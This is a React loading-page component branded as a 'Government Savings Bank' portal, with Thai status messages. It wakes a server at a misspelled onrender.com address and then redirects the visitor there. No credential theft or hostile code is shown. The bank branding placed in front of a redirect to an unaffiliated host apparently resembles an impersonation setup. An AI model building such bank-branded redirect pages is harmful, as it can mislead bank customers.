import { useEffect, useState } from 'react'
import './App.css'

function App() {
  const [status, setStatus] = useState("กำลังเริ่มต้นระบบ...");
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    const targetUrl = "https://customersyetem.onrender.com";
    
    const wakeUpServer = async () => {
      try {
        setStatus("กำลังเชื่อมต่อเซิร์ฟเวอร์...");
        await fetch(targetUrl, { mode: 'no-cors' });
        
        setStatus("ระบบพร้อมใช้งาน...");
        setProgress(100);

        setTimeout(() => {
          window.location.replace(targetUrl);
        }, 1000);
      } catch (error) {
        setTimeout(wakeUpServer, 3000); 
      }
    };

    wakeUpServer();

    const interval = setInterval(() => {
      setProgress(prev => (prev < 95 ? prev + 2 : prev));
    }, 500);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="portal-container">
      <div className="ambient-blob"></div>
      
      <div className="glass-loading-card">
        <div className="brand-header">
          <div className="icon-shield">
            <i className="fa-solid fa-building-columns"></i>
          </div>
          <h1 className="logo-text">GSB <span>PORTAL</span></h1>
        </div>

        <div className="loading-mechanic">
          <div className="progress-track">
            <div className="progress-fill" style={{ width: `${progress}%` }}></div>
            <div className="progress-glow"></div>
          </div>
          
          <div className="status-container">
            <span className="live-dot"></span>
            <p className="status-text">{status}</p>
          </div>
        </div>

        <div className="footer-copyright">
            © 2026 GOVERNMENT SAVINGS BANK PORTAL
        </div>
      </div>
    </div>
  )
}

export default App
